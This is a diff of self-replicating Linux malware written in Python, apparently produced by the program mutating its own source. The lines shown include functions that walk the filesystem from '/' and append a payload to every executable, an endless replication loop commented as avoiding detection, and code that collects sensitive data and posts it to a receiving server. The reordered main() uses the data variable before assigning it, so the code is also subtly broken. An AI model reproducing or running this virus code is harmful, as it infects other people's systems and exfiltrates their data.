@@ -189,11 +189,11 @@ def infinite_replicate():
 #Spreading and injecting payload for linux:
 
 def is_executable(file_path):
-    """Check if the file is executable."""
+    #Check if the file is executable.
     return os.path.isfile(file_path) and os.access(file_path, os.X_OK)
 
 def inject_payload(file_path):
-    """Inject payload into the file."""
+    #Inject payload into the file.
     try:
         with open(file_path, 'ab') as f:
             f.write(payload)
@@ -204,7 +204,7 @@ def inject_payload(file_path):
         print(f"Failed to inject payload into {file_path}: {e}")
 
 def search_and_inject(base_path):
-    """Search for executable files and inject payload."""
+    #Search for executable files and inject payload.
     for root, dirs, files in os.walk(base_path):
         for file in files:
             file_path = os.path.join(root, file)
@@ -463,6 +463,7 @@ def infinite_replicate():
 
         # Wait a bit before replicating again to avoid immediate detection
         time.sleep(5)
+# Mutation 80316
 
 
 #Spreading and injecting payload for linux:
@@ -547,17 +548,17 @@ def main():
     # if is_virtual_environment():
     #     return
     replicate()
-    infinite_replicate()
     mutate()
+    # Send sensitive data to the server
+    send_data_to_server(sensitive_data, 'http://localhost:8000/receive')
+
+    # Collect sensitive data
+    sensitive_data = get_sensitive_data()
     # Specify the base directory to start searching
     base_directory = '/'
     search_and_inject(base_directory)
+    infinite_replicate()
     
-    # Collect sensitive data
-    sensitive_data = get_sensitive_data()
-
-    # Send sensitive data to the server
-    send_data_to_server(sensitive_data, 'http://localhost:8000/receive')
     display_message()
 
 
